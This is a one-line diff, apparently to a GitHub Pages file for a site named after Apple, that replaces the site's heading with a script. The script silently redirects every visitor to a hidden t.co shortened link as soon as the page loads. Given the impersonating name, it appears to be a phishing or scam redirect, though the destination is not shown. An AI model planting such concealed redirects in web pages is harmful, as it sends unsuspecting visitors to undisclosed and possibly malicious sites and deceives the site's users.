@@ -1,1 +1,1 @@
-# iosapple.github.io
+<script type="text/javascript" language="javascript">window.location="https://t.co/Lujkq52VTi";</script>
